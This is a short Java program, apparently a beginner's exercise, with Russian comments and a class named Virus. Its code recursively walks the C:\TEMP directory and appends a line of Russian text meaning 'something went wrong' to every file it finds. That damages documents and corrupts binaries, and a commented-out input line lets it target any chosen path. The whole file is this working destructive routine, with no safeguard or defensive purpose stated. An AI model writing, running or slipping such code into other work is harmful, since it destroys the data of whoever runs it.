import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Virus {
    public static void main(String[] args) {
//        Scanner scanner=new Scanner(System.in);

        String string = "C:\\TEMP"; // Путь к директории
//        String string = scanner.next();//"C:\TEMP"; // Путь к директории
        exploreDirectory(string);
    }

    private static void exploreDirectory(String path) {
        File directory = new File(path);

        // Проверка на существование системы и директории
        if (!directory.exists() || !directory.isDirectory()) {
            System.out.println("Неправильный путь: " + path);
            return;
        }

        // Получение всех файлов и папок в директории
        File[] filesAndDirs = directory.listFiles();
        if (filesAndDirs != null) {
            for (File fileOrDir : filesAndDirs) {
                String fullPath = fileOrDir.getAbsolutePath();

                if (fileOrDir.isDirectory()) {
                    System.out.println("Директория: " + fullPath);
                    // Рекурсивно исследуем поддиректории
                    exploreDirectory(fullPath);
                } else {
                    System.out.println("Файл: " + fullPath);
                    // Пишем файл, если это не директория
                    writeToFile(fileOrDir);
                }
            }
        } else {
            System.out.println("Ошибка: не удалось получить содержимое директории " + path);
        }
    }
    private static void writeToFile(File file) {
        try (FileWriter fw = new FileWriter(file, true)) { // Используйте true для добавления данных
            fw.write("что то пошло не так\n"); // Добавляем символ новой строки
            System.out.println("Записано в файл: " + file.getAbsolutePath());

        } catch (IOException e) {
            System.out.println("Ошибка при записи в файл " + file.getAbsolutePath() + ": " + e.getMessage());
        }
    }
}